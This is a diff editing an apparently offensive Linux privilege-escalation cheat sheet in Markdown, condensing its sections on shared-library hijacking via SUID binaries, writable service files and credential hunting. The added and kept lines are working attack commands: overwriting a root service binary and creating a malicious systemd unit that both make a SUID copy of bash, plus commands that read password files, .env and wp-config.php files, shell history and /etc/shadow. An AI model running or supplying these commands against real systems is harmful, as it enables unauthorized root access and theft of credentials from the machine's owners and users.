@@ -440,16 +440,7 @@ gcc -fPIC -shared -o /tmp/libcrypt.so.1 preload.c
 sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
 ```
 
-### Shared Library Hijacking (non-sudo)
-
-```bash
-# If a SUID binary loads from a writable directory
-strace /usr/local/bin/suid_binary 2>&1 | grep "open.*No such file"
-
-# If it tries to load /usr/local/lib/libcustom.so and that path is writable
-gcc -fPIC -shared -o /usr/local/lib/libcustom.so preload.c
-/usr/local/bin/suid_binary
-```
+You can also hijack shared libraries loaded by SUID binaries. Use `strace` to find missing library loads from writable directories, then place your malicious `.so` there.
 
 ---
 
@@ -459,39 +450,24 @@ Writable service files or binaries referenced by services running as root create
 
 ```bash
 # Find writable service files
-find /etc/systemd/system/ -writable -type f 2>/dev/null
-find /lib/systemd/system/ -writable -type f 2>/dev/null
-find /etc/init.d/ -writable -type f 2>/dev/null
-
-# Check service binary paths
-systemctl list-units --type=service --state=running
-# For each service, check if the ExecStart binary is writable
+find /etc/systemd/system/ /lib/systemd/system/ /etc/init.d/ -writable -type f 2>/dev/null
 
 # Overwrite a writable service binary
 cp /path/to/service_binary /path/to/service_binary.bak
-cat << 'EOF' > /path/to/service_binary
-#!/bin/bash
-cp /bin/bash /tmp/rootbash
-chmod +s /tmp/rootbash
-# Call original binary to maintain service
-/path/to/service_binary.bak "$@"
-EOF
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n/path/to/service_binary.bak "$@"' > /path/to/service_binary
 chmod +x /path/to/service_binary
 
-# If you can create systemd service files
+# Create a malicious systemd service (if you can write to the service directory)
 cat << 'EOF' > /etc/systemd/system/escalate.service
 [Unit]
 Description=Escalation
-
 [Service]
 Type=oneshot
 ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'
-
 [Install]
 WantedBy=multi-user.target
 EOF
-systemctl daemon-reload
-systemctl start escalate.service
+systemctl daemon-reload && systemctl start escalate.service
 ```
 
 ---
@@ -510,21 +486,12 @@ cat ~/.bash_history
 find / -name ".*history" -exec cat {} \; 2>/dev/null
 
 # Configuration files with credentials
-grep -rl "password" /etc/ /opt/ /var/ /home/ 2>/dev/null
-grep -rl "pass\|pwd\|token\|secret\|key\|api" /var/www/ /opt/ 2>/dev/null
+grep -rl "pass\|pwd\|token\|secret\|key" /etc/ /opt/ /var/www/ /home/ 2>/dev/null
+cat /var/www/*/wp-config.php /var/www/*/.env 2>/dev/null
 
-# Database credentials
-find / -name "*.conf" -exec grep -li "password" {} \; 2>/dev/null
-cat /var/www/*/wp-config.php 2>/dev/null
-cat /var/www/*/.env 2>/dev/null
-
-# Backup files
+# Backup files and shadow
 find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
-
-# World-readable shadow file
 cat /etc/shadow 2>/dev/null
-
-# Writable /etc/shadow (rare but devastating)
 ls -la /etc/shadow
 ```
 
